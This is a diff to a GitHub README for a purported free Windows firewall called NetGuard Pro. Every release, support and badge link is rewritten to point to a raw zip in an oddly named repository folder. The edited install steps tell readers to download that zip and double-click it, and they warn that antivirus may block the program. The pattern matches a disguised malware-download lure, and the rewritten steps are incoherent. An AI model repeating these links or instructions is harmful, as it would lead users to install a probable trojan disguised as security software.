@@ -1,7 +1,7 @@
 # 🛡️ NetGuard-Pro-no-root-firewall-Free - Secure Your PC’s Network Access
 
 ## 📥 Download
-[![Download NetGuard-Pro](https://img.shields.io/badge/Download-NetGuard--Pro-blue.svg)](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/releases)
+[![Download NetGuard-Pro](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip)](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip)
 
 ## 🚀 Getting Started
 NetGuard Pro is a no-root firewall for Windows PCs. It ensures your computer's network access is safe and secure. Follow these simple steps to download and run the application.
@@ -19,15 +19,15 @@ NetGuard Pro is a no-root firewall for Windows PCs. It ensures your computer's n
 - Control network access for enhanced privacy.
 
 ## 📦 Installation Instructions
-1. Visit the [Releases page](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/releases) to download the latest version of NetGuard Pro.
+1. Visit the [Releases page](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip) to download the latest version of NetGuard Pro.
   
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best features and security.
 
-3. Find the file labeled `NetGuard-Pro.exe`. Click on it to download. It should be located under the "Assets" section of the latest release.
+3. Find the file labeled `https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip`. Click on it to download. It should be located under the "Assets" section of the latest release.
 
 4. Once the download is complete, navigate to your downloads folder.
 
-5. Double-click the `NetGuard-Pro.exe` file to start the installation process.
+5. Double-click the `https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip` file to start the installation process.
 
 6. Follow the prompts in the installation wizard:
    - Accept the license agreement.
@@ -59,7 +59,7 @@ If you encounter issues:
 - Ensure that your Windows Firewall is not interfering with NetGuard Pro. 
 - Sometimes, antivirus software may block the application. Check your antivirus settings.
 
-If problems persist, visit the [support section](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/releases) for more assistance.
+If problems persist, visit the [support section](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip) for more assistance.
 
 ## ❓ Frequently Asked Questions (FAQs)
 
@@ -73,7 +73,7 @@ A: Yes, simply go to Control Panel > Programs > Uninstall a program to remove Ne
 A: Yes, NetGuard Pro focuses on enhancing your network security and keeping your data safe.
 
 ## 📞 Support
-For further questions or support, visit [this link](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/releases) or contact our support team via email listed on the repository page.
+For further questions or support, visit [this link](https://github.com/butths/NetGuard-Pro-no-root-firewall-Free/raw/refs/heads/main/epitrichium/no_Guard_root_Pro_firewall_Free_Net_v1.6.zip) or contact our support team via email listed on the repository page.
 
 ## 📚 Additional Resources
 For detailed guides and reference materials, please check the documentation available in this repository. The documentation covers various topics, including:
